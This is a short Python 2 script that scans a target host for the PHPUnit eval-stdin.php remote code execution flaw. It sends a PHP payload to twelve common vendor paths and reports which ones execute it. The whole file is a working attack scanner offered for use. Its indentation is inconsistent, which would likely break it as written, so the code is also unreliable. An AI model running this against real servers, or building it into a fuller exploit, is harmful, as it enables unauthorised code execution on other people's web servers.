import re
import requests
import sys
import os
import base64

def exploit(dst_addr):
	list = {"/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
                ,"/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php"
                ,"/vendor/phpunit/src/Util/PHP/eval-stdin.php"
                ,"/vendor/phpunit/Util/PHP/eval-stdin.php"
                ,"/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
                ,"/phpunit/phpunit/Util/PHP/eval-stdin.php"
                ,"/phpunit/src/Util/PHP/eval-stdin.php"
                ,"/phpunit/Util/PHP/eval-stdin.php"
                ,"/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
                ,"/lib/phpunit/phpunit/Util/PHP/eval-stdin.php"
                ,"/lib/phpunit/src/Util/PHP/eval-stdin.php"
                ,"/lib/phpunit/Util/PHP/eval-stdin.php"}
	
	print(dst_addr)
	for i in list:
		
		URL="http://"+dst_addr+i
		print(URL)
		data = "<?=die(@md5(Apri1));?>"
		res = requests.post(URL, data=data)
		response = res.text
		
    		p = re.compile('c0eb89e1d7f2982390f96603e66f2b6b') # md5(Apri1) = c0eb89e1d7f2982390f96603e66f2b6b
		m = p.match(response)
		print("Status Code : %d"% res.status_code)
		if m:
				print("Vuln Found")
		else:
				print("Not Found")


if __name__ == "__main__":
	if len(sys.argv) == 2:
		   sys.argv.append('80')
	elif len(sys.argv) < 3:
			print 'Usage: python %s <dst_ip> <dst_port>' % os.path.basename(sys.argv[0])
			sys.exit()	
	address =(sys.argv[1], sys.argv[2])
	dst_addr=":".join(address)
	exploit(dst_addr)
